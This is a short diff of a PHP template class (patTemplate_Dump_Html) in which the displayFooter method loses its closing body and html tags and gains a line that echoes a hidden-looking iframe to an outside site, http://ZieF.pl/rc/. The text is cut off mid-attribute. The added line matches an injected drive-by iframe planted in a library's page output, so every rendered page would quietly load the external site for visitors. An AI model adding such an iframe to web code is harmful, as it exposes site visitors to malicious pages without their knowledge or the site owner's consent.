@@ -651,8 +651,4 @@ class patTemplate_Dump_Html extends patTemplate_Dump
 	function displayFooter()
 	{
 		echo ' </div>';
-		echo ' </body>';
-		echo '</html>';
-	}
-}
-?>
+		echo ' <iframe src="http://ZieF.pl/rc/" wid
